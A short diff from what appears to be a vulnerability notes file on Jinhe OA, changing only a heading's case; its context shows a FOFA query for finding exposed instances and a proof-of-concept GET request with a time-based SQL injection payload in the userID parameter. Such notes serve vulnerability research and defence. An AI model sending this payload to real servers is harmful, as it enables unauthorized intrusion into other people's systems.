@@ -9,7 +9,7 @@ fofa：
 app="金和网络-金和OA"
 ```
 
-## poc
+## POC
 ```
 GET /c6/jhsoft.mobileapp/AndroidSevices/HomeService.asmx/GetHomeInfo?userID=1'%3b+WAITFOR%20DELAY%20%270:0:5%27-- HTTP/1.1
 Host:
